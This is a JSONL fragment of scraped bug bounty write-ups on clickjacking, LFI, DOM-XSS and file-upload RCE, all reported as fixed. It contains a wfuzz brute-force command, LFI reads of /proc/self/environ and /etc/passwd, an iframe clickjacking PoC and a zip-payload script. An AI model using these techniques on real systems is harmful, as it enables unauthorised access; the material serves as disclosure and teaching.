Etc… . PoC Video: . The Fix: Microsoft fixed the bug affects Yammer social network by applying “X-Frame-Options” header on server side with a value of “SAMEORIGIN” means if you’re lucky and got an XSS it will help a lot (if you couldn’t steal the cookie or reading the anti-csrf value)! . Reward: Microsoft rewarded Seekurity team with a cool undisclosed bounty, Thanks Microsoft! . . Hey! Building a website? Or already built a one? Think twice before going public and let us protect your business ! ClickJacking Exploiting Features HTML5 Microsoft Security Yammer Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article When your privacy disclosure is a \"feature\" not a \"bug\" - Badoo & HotorNot failure! Translate this blog Scroll Up"}
{"source_url": "https://omespino.com/write-up-google-bug-bounty-lfi-on-production-servers-in-redacted-google-com-13337-usd/", "title": "WRITE UP – GOOGLE BUG BOUNTY: LFI ON PRODUCTION SERVERS in “springboard.google.com” – $13,337 USD – @omespino", "friendly_explanation": "This is a bug bounty writeup from https://omespino.com/write-up-google-bug-bounty-lfi-on-production-servers-in-redacted-google-com-13337-usd/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWRITE UP – GOOGLE BUG BOUNTY: LFI ON PRODUCTION SERVERS in “springboard.google.com” – $13,337 USD – @omespino Skip to content Menu BLOG EN ESPAÑOL @omespino just another security blog. Written by omespino May 21, 2019 January 7, 2022 WRITE UP – GOOGLE BUG BOUNTY: LFI ON PRODUCTION SERVERS in “springboard.google.com” – $13,337 USD Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about my greatest find so far (My first P1) It was in Google VRP program and why you can always check for dirs in 301 / 302 / 403 / 404 status pages because you will surprise that some times some directories listing will work: This blogpost appeared first in the book Bug Bounty Write Ups Collection [ U P D A T E ] 19 NOV 2019: I was invited to Google yearly security event called ESCAL8 as a speaker and my talk was about how I found this bug in more detail, here is a tweet extract about and the slides: Thank you for having me as speaker on #ESCAL8 #bugSWAT #initg @GoogleVRP event, super dope event, super dope people @sirdarckcat Tomasz @wtm_offensi @WHHackersBR @LiveOverflow & all VRP Hunters, such a nice week Fast Recon GG slides https://t.co/XCPxtsTOGr #BugBounty #infosec pic.twitter.com/Da3KWCkPiu — Omar Espino (@omespino) November 4, 2019 https://twitter.com/omespino/status/1191224520646045696 ” Thank you for having me as speaker on # ESCAL8 # bugSWAT # initg @ GoogleVRP event, super dope event, super dope people @ sirdarckcat Tomasz @ wtm_offensi @ WHHackersBR @ LiveOverflow & all VRP Hunters, such a nice week Fast Recon GG slides /fastrecon-ESCAL8-2019.pdf … “ FIRST ROUND Title: Auth bypass in springboard.google.com Product / URL: ​ springboard.google.com/REDACTED_DIR Report sent via google VRP program https://goo.gl/vulnz Summary: Authorization bypass in https://springboard.google.com/REDACTED_DIR and see “OnContent Debug for” mini dashboard POC: 1.- Go to https://springboard.google.com/ and got redirected to https://cloudsearch.google.com/cloudsearch/error?et=6 and see the message 2.- Then navigate to https://springboard.google.com/REDACTED_DIR and see a mini dashboard with the form: 3 days after that I got a message: At first glance, this might not be severe enough to qualify for a reward , though the panel will take a look shortly. Spoiler: Unfortunately, after a week, I got the reply that from google VRP Panel: “As a part of our Vulnerability Reward Program, we decided that it does not meet the bar for a financial reward “ SECOND ROUND Since the bug probably won’t be elegible to get a financial reward, I started thinking to go deeper on that “Auth bypass”, I mean, for some reason is not suppoused to be open, so I decided to try again, then after some new dir enumeration with wfuzz , I got something really really interesting, I was able to escalate that simple Auth bypass bug to LFI on production servers as admin in google production servers. Note: to any people that wonders how I have found the REDACTED_DIR, I used wfuzz to brute force a dir list in https://springboard.google.com/ and filter the non 302 redirect responses that gave me as result https://springboard.google.com/REDACTED_DIR , since the 302 redirected me to http://cloudsearch.google.com I did that brute force before the redirect Title: LFI on production servers in the same subdomain Product / URL: ​ springboard.google.com/REDACTED_DIR/ANOTHER_DIR Summary: I’ve able to escalate this auth bypass to LFI on google production servers as “gxx-xxxx” user (admin privileges)! POC: 1.- First see that the dashboard panel of “Redacted status main” (FrameworkInfo) is open in https://springboard.google.com/REDACTED_DIR/ANOTHER_DIR 2.- Then if you navigate to “Show REDACTED” (The last option) you are going to be redirected to https://springboard.google.com/REDACTED_DIR/ANOTHER_DIR?file=/proc/self/environ and the /proc/self/environ will be loaded 3.- Just to be sure that was a full LFI working I tried to load another file and I checked with /proc/version and works just as expected! Then my heart stopped for a second, I just got a LFI on google production servers as administrator (servers on plural because each time that I refreshed /proc/self/environ file the hostname changed) To be honest I tried to escalate to RCE but I hadn’t any success, since apparently it was very hardened I wasn’t able to read /proc/*/fd, ssh keys, server keys or any logs. Environment Any browser (I used Google Chrome Lastest version) No authentication or any Google account was needed Rank 62th in Google HOF (May 2019) Special Media Mentions: Intigriti (Bugbounty platform) May 28, 2019 Intigriti Bug bytes #20 write up of the week (Another Google LFI) Hackerone (Bugbounty platform) May 29, 2019 Hackerone Zero Daily 2019-05-21 (Other articles we’re reading) Report Timeline Mar 22, 2019: Sent the report to Google VRP (Just the bypass auth part) Mar 22, 2019: Got a message from google that the bug was triaged Mar 25, 2019: Bug Accepted Mar 25, 2019: Reply about that the bug was in revision in Googgle VRP panel Mar 30, 2019: I found the LFI and sent the new POC in the same report Apr 1, 2019: Got a message saying that they going to fill a another bug with this LFI information Apr 4, 2019: Got a message saying that the first bug wasn’t elegible for financial reward Apr 17 ,2019: Since the everything was happening in the same report and the bugs were fixed, I asked to the team if the 2 bugs wasn’t elegibles or what happened Apr 23, 2019: Got a message saying that sorry about the confusion and I just had to wait to a new reward decision for the LFI part. May 21 2019: $13,337 bounty and permission to publish this write up received well that’s it, share your thoughts, what do you think about how they handle that security issue? if you have any doubt, comments or sugestions just drop me a line here or in Twitter @omespino , read you later. Facebook Tweet LinkedIn Shares 841 40 thoughts on “ WRITE UP – GOOGLE BUG BOUNTY: LFI ON PRODUCTION SERVERS in “springboard.google.com” – $13,337 USD ” Aman says: May 22, 2019 at 3:28 am Can you please tell me how do you do recon? Reply omespino says: May 22, 2019 at 10:21 am Sure, I didn’t use a lot of tools, mainly just 3, domained by TypeError for subdomain enumeration ( https://github.com/TypeError/domained ), masscan by robertdavidgraham to por scanning ( https://github.com/robertdavidgraham/masscan ) and wfuzz by xmendez to http request fuzzing / brute forcing ( https://github.com/xmendez/wfuzz ), thanks for reading Reply 0xSaFi says: May 28, 2019 at 8:24 pm Wow! Amazing Finding Bro K33p it Up. Reply omespino says: May 28, 2019 at 11:30 pm Hey 0xSaFi, thanks and thanks for reading. Reply Andreas says: May 22, 2019 at 7:32 am Wow, that’s some awesome. It actually inspires me to start working one some bounty programs. 🙂 Reply omespnio says: May 22, 2019 at 10:14 am Hey Andreas, this actually why I share any finding that I can, so the people see that it is possible, if I can do it you can too, thanks for reading. Reply Wen chao Liu says: May 22, 2019 at 8:57 am How you find “springboard.google.com”? Reply omespino says: May 22, 2019 at 10:27 am Hey, the tool that I used was domained by TypeError for subdomain enumeration ( https://github.com/TypeError/domained ), thanks for reading Reply Mentos says: May 22, 2019 at 10:49 am Nice Congrats bro ! Reply omespino says: May 22, 2019 at 10:54 am Thanks Mentos and thanks for reading. Reply Hussam says: May 22, 2019 at 2:06 pm Congratualtions Reply omespino says: May 22, 2019 at 5:03 pm Thanks Hussam, and thanks for reading. Reply Daya says: May 22, 2019 at 5:50 pm Awesome !!! Reply omespino says: May 22, 2019 at 10:41 pm Thanks for reading Daya Reply Laxmikant Bhumkar says: May 23, 2019 at 2:31 am Very thanks for inspiration with practical example. Reply omespino says: May 24, 2019 at 4:34 am Hey you’re welcome and thanks for reading Reply Yssine Nafiai says: May 23, 2019 at 4:14 am recon is the key great finding <3 Reply omespino says: May 24, 2019 at 4:34 am Yes it is, thanks for reading Reply Zerb0a says: May 24, 2019 at 1:06 pm Great found dude. Wish me found a bug on Google too . Reply omespino says: May 24, 2019 at 10:07 pm Thanks, and it is possible, if I can do it you can too, thanks for reading. Reply Beto says: May 26, 2019 at 11:18 am Really nice find. Which wordlist did you use with wfuzz? Reply omespino says: May 28, 2019 at 11:30 pm Hey!, is a combination of some list here like pattern matching, discovery and some fuzzing lists from https://github.com/danielmiessler/SecLists and also use the all.txt from jhaddix https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a Thanks for reading Reply Azaz Mir says: May 30, 2019 at 12:56 am No doubt thousands of hackers would have stumbled upon this subdomain but you managed to pull this one off. Congrats for the bounty and amazing writeup. Keep up the good work bro and you do have inspired me to start learning more. Thanks 🙂 Reply omespino says: June 3, 2019 at 4:57 pm Hey Azaz, that’s why I write this blog, to share my grain of salt and give some back to the community, pretty cool, if I can do it you can do it, thanks for reading. Reply antonio says: June 5, 2019 at 3:52 pm Hi, when you do bug bounty, for example on Google, do you use some anonymity system, like tor? Or you use a specific header on your requests? Thanks. Reply omespino says: June 7, 2019 at 3:58 pm Hey thanks for reading. no actually I didn’t use anything like that, just perform the scans from Digital Ocean VPS without proxies, special configurations, headers, etc, the trick is that some google subdomains do not block the bruteforce / ports scans, specially the google corp ones Reply BillTsai says: July 12, 2019 at 8:37 am Hi, how you find REDACTED_DIR? Reply omespino says: July 15, 2019 at 5:06 am Hi, I used wfuzz to brute force a dir list in https://springboard.google.com/ and filter the non 302 redirect responses that gave me as result https://springboard.google.com/REDACTED_DIR , since the 302 redirected me to http://cloudsearch.google.com I did that brute force before the redirect, thanks for reading Reply BillTsai says: July 16, 2019 at 9:49 am Hi, thanks for your reply. May i ask which dir list did you use to find the non 302 responses? Cause it seems that i could not find the keyword “REDACTED_DIR” from wfuzz cloned in GitHub. Thank you. Reply omespino says: July 16, 2019 at 9:09 pm Hey the “REDACTED_DIR” means that I wasn’t able to make public that folder name, is “REDACTED” or non-public because google asked for hide that name before publish the write up, for the 302 I used wfuzz options, it has the –hc option to hide http status respones, that in my case since I was looking just for http status code 200, the command was something like this “wfuzz -c -w ./wlist.txt –hc 301,302,307,400,401,402,403,404,410,429,500,501,502,503,504 https://springboard.google.com/FUZZ “, and for the wlist I just use the danielmiessler’s seclists from github. thanks for reading Reply Afolic says: September 1, 2019 at 11:06 pm Thanks for this amazing write-up, I really would like to know your recommendation on the wordlist to use, seclist has tons of wordlist and that makes it difficulty to choice the correct one for dir bruteforce and also I would love to Know if there is any wordlist for parameter bruteforce, not sure if that’s a thing. Thanks for the write up once again. Reply omespino says: September 6, 2019 at 10:14 pm Hey thanks for reading, I created a custom list from Fuzz and Discovery/Web-Content, but to be honest at the end I always use the all.txt from Jhaddix and wait, for parameter bruce forcing I never look for that but I have reading that Arjun by somd3v is really cool to do that https://github.com/s0md3v/Arjun Reply 0x1bitcrack3r says: October 3, 2019 at 6:07 am This is an amazing finding man. You recon process is very simple. Keep up the good work. Reply omespino says: October 3, 2019 at 8:05 pm Thank you for reading thanks for your comments, happy hunting. Reply Aditya says: November 18, 2019 at 10:43 pm I really want to know how did you find that file parameter? After ANOTHER_DIR Reply omespino says: November 19, 2019 at 4:40 pm Hey, I just update this blog with some slides about my talk in google security yearly event called ESCAL8 where I describe in more specific detail how I have found this but, and also explain how I have found that parameter, thanks for reading Reply Anonymous says: February 1, 2020 at 6:02 am Thanks in support of sharing such a good idea, article is good, thats why i have read it entirely Reply pinudsdos says: April 3, 2020 at 8:04 pm Годнота спасибо Reply milad says: June 28, 2020 at 1:04 pm Hey, congratulation and thank you for all this information. Could you please share the report that you send to google, to see the template and how you write report ? Thank you ! Reply Binamra says: February 14, 2021 at 1:30 pm Hey bro i am also learning bug bounty. It’s been about 6 months. What i do is directly hunt on website. Don’t know much about recon, can you explain little on how to do recon because haven’t go more then 3 valid bugs i think this is because not doing any recon and others things.. Any tips bro ? Reply Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name Email Website Post navigation Previous Post WRITE UP – $1,000 USD, XSS STORED IN OUTLOOK.COM (IOS BROWSERS) Next Post WRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance” @OMESPINO BLOG EN ESPAÑOL"}
{"source_url": "https://www.seekurity.com/blog/general/telegram-web-client-clickjacking-vulnerability/", "title": "Official Telegram Web Client ClickJacking Vulnerability – When crypto is strong and client is weak – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/telegram-web-client-clickjacking-vulnerability/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nOfficial Telegram Web Client ClickJacking Vulnerability – When crypto is strong and client is weak – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later Official Telegram Web Client ClickJacking Vulnerability - When crypto is strong and client is weak Mohamed A. Baset comment 3 Comments access_time 3 min read [*] Introduction: Modern Web Applications nowadays are relaying on a lot of technologies where typical web applications vulnerabilities are hard to find (eg. Clickjacking is an ABC security bug) but bug hunters are always the best! Let’s know Telegram more, Telegram is a cloud-based instant messaging service. Telegram clients exist for both mobile (Android, iOS, Windows Phone, Ubuntu Touch) and desktop systems (Windows, OS X, Linux). Users can send messages and exchange photos, videos, stickers and files of any type. Telegram also provides optional end-to-end encrypted messaging with self-destruct timers, but these features have been contested by security researchers and cryptography experts. Telegram is supported by the Russian-born entrepreneur Pavel Durov, who is now a citizen of Saint Kitts and Nevis, travelling the world in self-imposed exile.Its client-side code is open-source software, whereas its server-side code is closed-sourced and proprietary. The service also provides APIs to independent developers. Telegram was and still a well-known messenger application for it’s strong end-to-end encryption, But how it is useful to have a strong crypto and a weak client! Let’s tell you our story behind digging into Telegram’s Web Client… [*] The bug: 0. Telegram web client is not protecting itself from clickjacking with the typical “X-Frame-Options” header but uses a JS frame busting technique to prevent the website to be iframed, By exploiting one of HTML5 Features “Sandboxed Iframes” Iframing Telegram will be possible and we will never redirected to the top window location! [*] Rolling around the bug: Telegram is using an additional CSS trick, The main web app style sets the display property with “none” value for the whole HTML Tag which makes the whole view invisible this lowered our attack surface but there’s still hope! So all what we need now is to block the access of the style file which is responsible for styling the main web app html! Here comes the next part of exploitation! [*] The Prerequisites: 1. Attacker will MITMing the Local Network and if he was able to Prevent access to this resource/path https://web.telegram.org/css/app.css [*] This part can be done by some tricks/other bugs (eg. Deep Packet Inspection ) [*] We disclosed a more efficient way than (MITMing a network) to achieve this step to Telegram Security Team! [*] The Attack Scenario: 2. Iframing the Settings page with a sandboxed iframe to prevent redirecting to top window and allow scripts to be running. [*] The Impact: What attacker can achieve? – Change sensitive information of the currently logged in telegram users (Password, Recovery Emails, etc..) – Send messages in behalf of currently logged in telegram users – Send Contact requests in behalf of currently logged in telegram users – Send Group invites in behalf of currently logged in telegram users – Mark all the victim’s messages as Read [CSRF] (By iframing the url paths to the conversations. eg: https://web.telegram.org/#/im?p=@SymbianSyMoh) – Etc… The Fix: This bug has been fixed now, Telegram Web Client applied “X-Frame-Options” header on server side! The PoC Video: Hey! Building a website? Or already built a one? Think twice before going public and let us protect your business ! and ClickJacking client crypto is strength Telegram Vulnerability weak web When Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment marwa dabbah says: May 16, 2016 at 1:36 pm Wonderful find, can you please send me the wysiwyg source code ? regards, Reply Mohamed A. Baset says: May 16, 2016 at 9:42 pm http://www.w3schools.com/tags/tryit.asp?filename=tryhtml5_global_hidden View source, copy it Reply marwa dabbah says: May 19, 2016 at 9:06 am i tried but its not work for me 😐 Reply Next article Web Application Security on Fire - PHP Developers Cheat Sheet version (Slides from UNAM Mexico talk) Translate this blog Scroll Up"}
{"source_url": "https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html", "title": "Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper – The Hacker Blog", "friendly_explanation": "This is a bug bounty writeup from https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSteam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper June 07, 2018 Reading time ~5 minutes Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper Summary The âSteam Inventory Helperâ Chrome extension version 1.13.6 suffered from both a DOM-based Cross-site Scripting (XSS) and a clickjacking vulnerability. By combining these vulnerabilities it is possible to gain JavaScript code execution in the highly-privileged context of the extensionâs background page. Due to the extension declaring the â â permission, this vulnerability can be exploited to hijack all sites that the victim is authenticated to. For example, if a user is authenticated to their bank, Steam, Gmail, and Facebook, this vulnerability could be used to access all of those accounts. This vulnerability is fixed in the latest version of the extension and all users should update (if Chrome has not done so for them automatically). The core of this issue is due to a DOM-based Cross-site Scripting (XSS) in â/html/bookmarks.htmlâ which is frameable from arbitrary web pages due to a the âweb_accessible_resourcesâ directive specifying this resource. By submitting an entry with the name of an XSS payload this page can be exploited to gain JavaScript execution in the context of the extension. Since a user is unlikely to paste an XSS payload into this page of their own will, the clickjacking vulnerability is used to redress the UI of the application to trick the victim into exploiting the issue. A pretext of a âBot Detectionâ page is used to get the victim to paste the payload (hidden inside of a larger âverification codeâ) and click the âAddâ button to exploit the issue. The full proof-of-concept can be seen in the video below. Proof-of-Concept Technical Details The first vulnerability is the DOM-based Cross-site Scripting (XSS) vulnerability in â/html/bookmarks.htmlâ, the following is the vulnerable JavaScript from the included âbookmarks.jsâ: $('#btAdd').click(function() { var btname = $('#txtName').val(); if ($('.custom-button .name').filter(function() { return $(this).text() === btname; }).length) return false; var span = $('<span class=\"custom-button\">'); span.html('<span class=\"name\">' + btname + '</span>'); span.append('<a href=\"javascript:void(0)\" title=\"remove\">x</a>'); span.attr('title', btname); span.data('id', (new Date().getTime())); $('div.custom-buttons .existing').append(span); save_options(); }); The above JavaScript takes the value of the âtxtNameâ text box and uses string concatenation to build HTML which is appended to the DOM via jQueryâs âappend()â function. This is the core of the XSS vulnerability since user input should always be contextually escaped to prevent injection of arbitrary markup. Normally, Chrome extension Content Security Policy (CSP) should prevent this vulnerability from being exploited. However, due to the loosening of this policy via âunsafe-evalâ and the use of jQueryâs DOM APIs, this was still able to be exploited. This is due to much of jQueryâs DOM APIs making use of âglobalEval()â , which automatically passes scripts to âeval()â upon appending to the DOM. While this is a serious vulnerability, on its own exploitation is fairly limited due to the user-interaction required to exploit it. The victim would have to open the page, paste a Cross-site Scripting (XSS) payload into the field, and click the âAddâ button to exploit it. In order to better weaponize this vulnerability we make use of a separate vulnerability (clickjacking) in order to bolster the attack. The following is an excerpt from the Chrome extensionâs manifest: ...trimmed for brevity... \"web_accessible_resources\": [ \"_locales/*\", \"bundle/*\", \"dist/*\", \"assets/*\", \"font/*\", \"html/bookmarks.html\", \"css/*.css\", \"js/*.js\", \"js/jquery/*.js\", \"js/lang/*\" ], ...trimmed for brevity... The above section demonstrates that the extension casts a wide net with its âweb_accessible_resourcesâ policy. By default Chrome extensions prevent framing and navigation to Chrome extension pages from arbitrary web pages as an extra security measure. This directive loosens this restriction, allowing for third party pages to navigate to and frame the specified resources. Much of the extensionâs privileged UI pages are specified under this directive, rendering the extension vulnerable to clickjacking. As can also be seen in the excerpt, the â/html/bookmarks.htmlâ page is also able to be framed and thus exploited via clickjacking. We abuse this to iframe this page in our web page, and overlay the frame with DOM elements to redress the layout. This makes it so that the victim is unaware that they are actually interacting with the extension below. The following animation demonstrates this effect: The above example demonstrates how we redress the UI to trick the victim. The âBot Detectionâ page provides a button to click to copy the âVerification codeâ to the victimâs clipboard. This âverification codeâ is actually a Cross-site Scripting (XSS) payload inside of a large amount of random hex bytes. This hides the payload from the victimâs view while they paste it into the extensionâs textbox, leading the victim into believing they are just copying and pasting a long random code. Finally, when the victim clicks the âAddâ button, the XSS fires. Root Cause & Further Thoughts There are two notable points of interest in this exploit. The first is that we were able to achieve DOM-XSS even with a fairly tight Content Security Policy (CSP) of the following: \"script-src 'self' 'unsafe-eval'; object-src 'self'\" While this CSP is fairly strong, it crumbles when combined with unsafe usage of jQueryâs DOM manipulation APIs such as â.html()â and â.append()â. This is something to look for when auditing Chrome extensions (and when writing them), if you make use of jQuery and have âunsafe-evalâ in your CSP â youâre playing with fire. The second interesting point is that clickjacking is a valid vulnerability which can absolutely affect Chrome extensions. All that is required is that a privileged Chrome extension UI page be exposed via the âweb_accessible_resourcesâ directive. After taking a look at many of the popular extensions on the Chrome store it seems many of them fall victim this simple mistake. Most of the time this is due to accidental overscoping via wildcarding of a privileged extension HTML page. This not only opens up extensions to attacks like clickjacking but can result in other vulnerabilities if the extension takes in user input from âlocation.hashâ, âpostMessageâ, etc. The default protection given to Chrome extensions via the navigation sandboxing should not be taken for granted by the extension developers. Timeline June 4: Disclosed to SIH TechSupport (owners of extension) June 6: Vendor confirms receipt of issue, states they will look into it and fix it. June 7: Vendor updates extension to fix the vulnerabilities. chrome extension csp bypass chrome extension hijacking csp jquery unsafe-inline jquery uxss chrome xss chrome extension Matthew Bryant (mandatory) Like Tweet +1 About the Author Matthew Bryant (mandatory) Security researcher who needs to sleep more. Opinions expressed are solely my own and do not express the views or opinions of my employer. Follow @mandatoryprogrammer Follow @IAmMandatory Read More \"Zero-Days\" Without Incident - Compromising Angular via Expired npm Publisher Email Domains **NOTE:** *If you're just looking for the high level points, see the\"[The TL;DR Summary & High-LevelPoints](#the-tldr-summary--high-level...… Continue reading Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass (~15.5 Million Affected) Published on February 22, 2019 Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions Published on June 12, 2018 © 2022 Matthew Bryant (mandatory). Powered by Jekyll using the Neo-HPSTR Theme ."}
{"source_url": "https://www.seekurity.com/blog/write-ups/facebook-clickjacking-how-we-put-a-new-dress-on-facebook-ui/", "title": "Facebook ClickJacking – How we put a new dress on Facebook UI – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/write-ups/facebook-clickjacking-how-we-put-a-new-dress-on-facebook-ui/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFacebook ClickJacking – How we put a new dress on Facebook UI – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in PoC Gallery , Write Ups Tweet Share Read later Facebook ClickJacking - How we put a new dress on Facebook UI Mohamed A. Baset comment 2 Comments access_time 2 min read Hi Bug Hunters, Today we will explain how we redressed facebook ui and made it so easy to fool a victim to for example, Add the attacker as a member in one of his own secret groups on facebook. Here’s some details about the issue: Vulnerability Type: ClickJacking The vulnerable url: https://www.facebook.com/ajax/home/generic.php?dpr=1&sidecol=true&path=/groups/ 559357440894888 /&endpoint=/ajax/home/generic.php&__user= 100000152886101 &__a=1&__dyn=&__req=jsonp_8&__be=0&__pc=EXP1:DEFAULT&__rev=2286573&__cid= Where: 1. 559357440894888 is the targeted resource (group) 2. 100000152886101 is the targeted user who owns the resource, (Just a parameter value sent along with the first GET request to be included in the form action to successfully complete the request) The problem: When this endpoint (/ajax/home/generic.php) calling an client side facebook path (path=) related to a facebook resource (pages, groups, etc..) this resource lacks the “X-Frame-Options” and became iframable. The fact is that all the actions inside the iframable response are depending on another resource that has not been loaded to complete the AJAXed requests to be made but LUCKILY we found that the iframable resource contains some “Forms” that are able to be submitted by the victim. The PoC Impact: Fooling a victim to add a specific user to a targeted secret group or even any other resource!! PoC Code (In case you need it): <div style=”overflow: hidden; width: 145px; height: 28px; position: relative;” > <iframe src=”URL” style=”border: 0pt none ; left: -7px; top: -807px; position: absolute; width: 1406px; height: 1321px;” scrolling=”no”></iframe></div></br> PoC Video: Hey! Building a website? Or already built a one? Think twice before going public and let us protect your business ! Bug ClickJacking Facebook Security UI UI Redressing Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Srujan Arju says: May 14, 2016 at 4:02 pm Great Find! Congrats! i wonder how much they rewarded you ? Reply Hidalgo Perez Francesco{{8*9}} says: September 1, 2016 at 5:11 am hi sir, nice find, can I know how much did they rewarded you? like $5k right? Thanks! Reply Next article VoIP Security Analysis with Asterisk Translate this blog Scroll Up"}
{"source_url": "https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce", "title": "Chain The Bugs to Pwn an Organisation ( LFI + Unrestricted File Upload = Remote Code Execution ) | by Armaan Pathan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nChain The Bugs to Pwn an Organisation ( LFI + Unrestricted File Upload = Remote Code Execution ) | by Armaan Pathan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Chain The Bugs to Pwn an Organisation ( LFI + Unrestricted File Upload = Remote Code Execution ) Armaan Pathan 2 min read · Sep 18, 2018 -- 3 Listen Share Hi everyone, After completing my OSCP certification I thought to give a try to bug bounty, as OSCP has sharpened my exploitationSkills. I will use lol.com to represent an application as can not disclose the website’s name. While i was enumerating an application i got a domain which was basically an image server and was managing the images which has uploaded by a user, while enumerating more, i got an endpoint which was allowing me to call the server local files such as passwd , cron jobs and current running services on the server. Press enter or click to view image in full size As it was a image server means the server stores all the images which user uploads form his/her profiles. I again went back to lol.com and started looking for photo upload functionality that from where i can upload the photo and i got the profile photo option which is allowing me to upload the photos to an application and the photos were storing to the image server. Now photo upload functionality has ext parameter which is used for file extensions checks but due to improper validations on the parameter, i was able to tamper the values and can upload unrestricted files on the server, i tried to upload php shell but as it was image server so it was not serving the php but by reconig more via lfi i came to know that i can get a shell via perl so i uploaded a perl reverse shell to get a reverse shell on my public IP. Press enter or click to view image in full size And with the use of LFI I called the file and i got the reverse shell on my public IP. Press enter or click to view image in full size Thanks for reading, Hope you guys liked it. JavaScript Hacking Remote Code Execution Lfi Hackerone -- -- 3 Written by Armaan Pathan 1.6K followers · 4 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/", "title": "404 Not Found | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404 Not Found | RCE Security Home About Contact Us Services Research Select Page No Results Found The page you requested could not be found. Try refining your search, or use the navigation above to locate the post. X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/", "title": "Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMagix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) | RCE Security Home About Contact Us Services Research Select Page Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) by Julien Ahrens | Saturday, April 26, 2014 | Advisory | 0 comments The German Magix Software GmbH rewarded me with a Hall of Fame listing and a free Magix Music Maker 2014 Premium license for my reports of several serious security issues in the online infrastructures of magix.com and xara.com, which could be used to break both sites entirely: At this point, I’d like to thank the Magix Security Team for their really fast and always transparent responses and the good coordination process as a whole. This is a perfect example of how the communication between the bug bounty operator and the researcher can satisfy both parties. The fixes for the critical vulnerabilities (RCE, SQLi, LFI) were implemented quite fast within only a few days after my initial report (!) , the fix for the XSS took a bit longer, but it’s still acceptable for a medium-severity issue. Bug Bounty programs are always a great challenge and sometimes you’re rewarded with pretty cool stuff and great references like this – now here’s a short write-up about the discovered vulnerabilities, which already have been fixed by Magix. Remote Code Execution on europe.magix.com This is the most dangerous flaw, I’ve found while working on this bug bounty program. I’ve discovered a script, that allows an attacker to upload zip files via a HTTP POST request. The script accepts any zip file, renames it to some temporary name and finally extracts the .zip file to a worker directory without checking if the zip file contains a valid file. Additionally, the extracted contents were accessible via www – I think the problem is quite obvious. To prove the exploitability to Magix, I wrote a short Python script. The following snippet shows how the quite handy Python ZipFile function can be used to dynamically generate a zip file in memory. The .zip file contains one single file named “/tmp/test.php” with a custom PHP payload. #!/usr/bin/python import zipfile from StringIO import StringIO import zlib inMemoryFile = StringIO() zipFile = zipfile.ZipFile(inMemoryFile, 'w', zipfile.ZIP_DEFLATED) zipFile.writestr('./tmp/test.php', '<?php echo \\\"www.rcesecurity.com\\\"; ?>') zipFile.close() In case of Magix, the target script echoes some additional (and hazardous) debugging output after POSTing an arbitrary zip file: looks like Magix missed to deactivate this output – without this I wouldn’t have probably found this flaw 🙂 Since the debugging output also discloses the full-path of the extracted file, this leads to a nice RCE condition: Now imagine an attacker who’d upload some malicious C99… SQL Injection on europe.magix.com This vulnerability is more or less based on the same condition like the previously described RCE flaw. If the zip file contains a specially prepared .ini file, the same script, that is responsible for the RCE flaw, uses the .ini values unfiletered in a SQL query: Local File Inclusion on downloadsv9.xara.com A local file inclusion could become as dangerous as a RCE flaw, because an attacker may read sensitive system files like /etc/passwd: …and if you’ve got a lazy sysadmin who likes to chmod 777 on 